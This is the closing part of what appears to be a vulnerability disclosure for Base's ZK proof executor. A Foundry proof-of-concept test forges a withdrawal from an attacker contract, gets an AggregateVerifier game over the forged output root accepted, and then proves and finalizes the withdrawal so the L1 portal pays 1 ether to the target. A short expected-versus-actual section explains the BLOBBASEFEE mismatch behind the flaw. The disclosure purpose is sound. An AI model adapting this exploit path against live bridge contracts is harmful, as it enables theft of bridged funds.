    uint256 internal constant L2_CHAIN_ID = 8453;
    uint256 internal constant BLOCK_INTERVAL = 100;
    uint256 internal constant INTERMEDIATE_BLOCK_INTERVAL = 10;
    uint256 internal constant PROOF_THRESHOLD = 1;

    address internal constant ZK_PROVER = address(0xA11CE);
    address internal constant ATTACKER_CONTRACT = 0x4242424242424242424242424242424242424242;
    address internal constant WITHDRAWAL_TARGET = 0x2222222222222222222222222222222222222222;

    bytes32 internal constant TEE_IMAGE_HASH = keccak256("tee-image");
    bytes32 internal constant ZK_RANGE_HASH = keccak256("zk-range");
    bytes32 internal constant ZK_AGGREGATE_HASH = keccak256("zk-aggregate");
    bytes32 internal constant CONFIG_HASH = keccak256("config");

    BlobbasefeeStrictJournalVerifier internal strictZkVerifier;

    function setUp() public override {
        super.setUp();

        // Deploy a normal AggregateVerifier game type, but wire its ZK verifier to the
        // strict local verifier above so the test can isolate the downstream portal impact.
        MockVerifier teeVerifier = new MockVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));
        strictZkVerifier = new BlobbasefeeStrictJournalVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));

        AggregateVerifier aggregateVerifierImpl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWeth))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(strictZkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            PROOF_THRESHOLD
        );

        disputeGameFactory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(aggregateVerifierImpl)));
        disputeGameFactory.setInitBond(AGGREGATE_VERIFIER_GAME_TYPE, 0);

        // Make the local portal respect the multiproof game type, matching the withdrawal path.
        vm.prank(optimismPortal2.guardian());
        anchorStateRegistry.setRespectedGameType(AGGREGATE_VERIFIER_GAME_TYPE);
    }

    function testAcceptedBlobbasefeeForgedWithdrawalRootPaysOutFromPortal() public {
        // This is the withdrawal that PoC 1 showed can exist only in the proof-executor state.
        Types.WithdrawalTransaction memory forgedWithdrawal = Types.WithdrawalTransaction({
            nonce: uint256(1) << 240,
            sender: ATTACKER_CONTRACT,
            target: WITHDRAWAL_TARGET,
            value: 1 ether,
            gasLimit: 100_000,
            data: hex""
        });

        // Reuse the repository's existing FFI helper to build the output root proof and
        // storage proof for L2ToL1MessagePasser.sentMessages[withdrawalHash].
        (
            bytes32 stateRoot,
            bytes32 storageRoot,
            bytes32 outputRoot,
            bytes32 withdrawalHash,
            bytes[] memory withdrawalProof
        ) = ffi.getProveWithdrawalTransactionInputs(forgedWithdrawal);

        Types.OutputRootProof memory outputRootProof = Types.OutputRootProof({
            version: bytes32(0),
            stateRoot: stateRoot,
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: bytes32(0)
        });

        assertEq(outputRoot, Hashing.hashOutputRootProof(outputRootProof));
        assertEq(withdrawalHash, Hashing.hashWithdrawal(forgedWithdrawal));

        // Create and resolve a ZK AggregateVerifier game whose root claim is the forged root.
        (AggregateVerifier game, uint256 gameIndex) = _createAcceptedZkGame(outputRoot);

        assertEq(uint8(game.status()), uint8(GameStatus.DEFENDER_WINS));

        // Once the game passes finality, the portal accepts withdrawal proofs against it.
        vm.warp(block.timestamp + anchorStateRegistry.disputeGameFinalityDelaySeconds() + 1);
        assertTrue(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(game))));

        optimismPortal2.proveWithdrawalTransaction(forgedWithdrawal, gameIndex, outputRootProof, withdrawalProof);

        // After proof maturity, finalization pays the withdrawal target from the L1 portal.
        vm.warp(block.timestamp + optimismPortal2.proofMaturityDelaySeconds() + 1);
        vm.deal(address(optimismPortal2), forgedWithdrawal.value);

        uint256 targetBalanceBefore = WITHDRAWAL_TARGET.balance;
        optimismPortal2.finalizeWithdrawalTransaction(forgedWithdrawal);

        assertTrue(optimismPortal2.finalizedWithdrawals(withdrawalHash));
        assertEq(WITHDRAWAL_TARGET.balance, targetBalanceBefore + forgedWithdrawal.value);
    }

    function _createAcceptedZkGame(bytes32 outputRoot) internal returns (AggregateVerifier game, uint256 gameIndex) {
        // Build a normal AggregateVerifier claim over one block interval ending at the forged root.
        (Hash startingRoot, uint256 startingBlockNumber) = anchorStateRegistry.getAnchorRoot();
        uint256 l2BlockNumber = startingBlockNumber + BLOCK_INTERVAL;
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(l2BlockNumber), outputRoot);
        bytes memory extraData =
            abi.encodePacked(uint256(l2BlockNumber), address(anchorStateRegistry), intermediateRoots);

        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;

        // The verifier will accept only the exact journal AggregateVerifier computes for this root.
        strictZkVerifier.setExpectedJournal(
            keccak256(
                abi.encodePacked(
                    ZK_PROVER,
                    l1OriginHash,
                    startingRoot.raw(),
                    uint64(startingBlockNumber),
                    outputRoot,
                    uint64(l2BlockNumber),
                    intermediateRoots,
                    CONFIG_HASH,
                    ZK_RANGE_HASH
                )
            )
        );

        // The proof bytes are not used by the strict local verifier; the important part is
        // that the AggregateVerifier journal and root flow are exercised normally.
        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK),
            l1OriginHash,
            l1OriginNumber,
            bytes("zk proof over the BLOBBASEFEE-only withdrawal post-state")
        );

        // Create the game as the ZK prover and resolve it after the slow finalization delay.
        vm.prank(ZK_PROVER);
        game = AggregateVerifier(
            address(
                disputeGameFactory.createWithInitData(
                    AGGREGATE_VERIFIER_GAME_TYPE, Claim.wrap(outputRoot), extraData, proof
                )
            )
        );
        gameIndex = disputeGameFactory.gameCount() - 1;

        vm.warp(block.timestamp + game.SLOW_FINALIZATION_DELAY() + 1);
        game.resolve();
    }

    function _generateIntermediateRootsExceptLast(uint256 l2BlockNumber) internal pure returns (bytes memory) {
        // Fill the intermediate-root list required by AggregateVerifier; the final root is appended by caller.
        bytes memory intermediateRoots;
        uint256 startingL2BlockNumber = l2BlockNumber - BLOCK_INTERVAL;
        for (uint256 i = 1; i < BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL; i++) {
            intermediateRoots = abi.encodePacked(
                intermediateRoots, keccak256(abi.encode(startingL2BlockNumber + INTERMEDIATE_BLOCK_INTERVAL * i))
            );
        }
        return intermediateRoots;
    }
}
```

</details>

## Expected vs Actual

Expected:

Every Base execution path, including the ZK proof executor, should expose `BLOBBASEFEE == 1` for Cancun-and-later Base blocks because L2 blobs are disabled.

Actual:

Canonical Base execution hardcodes `BLOBBASEFEE == 1`, but the ZK proof executor derives it from the parent header. After Jovian, the parent header's `blob_gas_used` is a DA-footprint value, so the proof executor can expose `BLOBBASEFEE > 1` for the same block where canonical Base exposes `1`.
